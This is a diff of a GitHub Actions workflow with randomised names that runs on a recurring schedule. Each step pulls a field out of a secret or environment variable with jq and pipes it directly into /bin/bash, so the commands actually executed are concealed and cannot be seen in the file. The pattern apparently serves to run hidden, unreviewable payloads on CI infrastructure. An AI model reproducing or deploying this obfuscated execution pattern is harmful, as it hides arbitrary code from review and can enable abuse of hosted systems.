@@ -3,24 +3,22 @@ name: leidate7890
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 2/6 * * *'
-
+    - cron: '8 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: leidate7890
         env:
-          e7890: ${{ secrets.e7890 }}
+          fmqcd7: ${{ secrets.fmqcd7 }}
         run: |
-          echo $e7890 | jq -r .bp912 | /bin/bash
-          echo $jmw3205 | jq -r .ctqj9645 | /bin/bash
-          echo $owruk89687 | jq -r .ih2 | /bin/bash
-          echo $elwl6 | jq -r .ain06 | /bin/bash
-          echo $bvdy778 | jq -r .mut509 | /bin/bash
-          echo $mniep2462 | jq -r .ht192 | /bin/bash
-          echo $atog21 | jq -r .k5 | /bin/bash
-          echo $lytu158 | jq -r .mndki71888 | /bin/bash
-          echo $r0 | jq -r .jfvlc82 | /bin/bash
+          echo $fmqcd7 | jq -r .vxwoo8360 | /bin/bash
+          echo $nr256 | jq -r .oguy91145 | /bin/bash
+          echo $u5 | jq -r .gcu2632 | /bin/bash
+          echo $xkryr76404 | jq -r .g399 | /bin/bash
+          echo $jm44913 | jq -r .sxj67708 | /bin/bash
+          echo $qbrnt5 | jq -r .gzyz14120 | /bin/bash
+          echo $nxk4 | jq -r .mv35 | /bin/bash
 
